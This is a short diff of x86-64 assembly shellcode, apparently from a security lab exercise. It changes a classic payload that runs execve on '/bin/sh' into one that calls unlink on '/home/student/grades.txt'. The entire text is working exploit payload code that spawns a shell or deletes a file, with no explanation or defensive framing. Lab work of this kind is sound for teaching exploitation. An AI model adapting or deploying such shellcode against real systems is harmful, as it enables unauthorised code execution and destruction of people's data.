@@ -1,7 +1,7 @@
 #include <sys/syscall.h>
 
-#define STRING	"/bin/sh"
-#define STRLEN	7
+#define STRING	"/home/student/grades.txt"
+#define STRLEN	24
 #define ARGV	(STRLEN+1)
 #define ENVP	(ARGV+8)
 
@@ -18,7 +18,7 @@
 	movb	%al,(STRLEN)(%rcx)	/* null-terminate our string */
 	movq	%rax,(ENVP)(%rcx)	/* set up null envp */
 
-	movb	$SYS_execve,%al		/* set up the syscall number */
+	movb	$SYS_unlink,%al		/* set up the syscall number */
 	movq	%rcx,%rdi		/* syscall arg 1: string pathname */
 	leaq	ARGV(%rcx),%rsi		/* syscall arg 2: argv */
 	leaq	ENVP(%rcx),%rdx		/* syscall arg 3: envp */
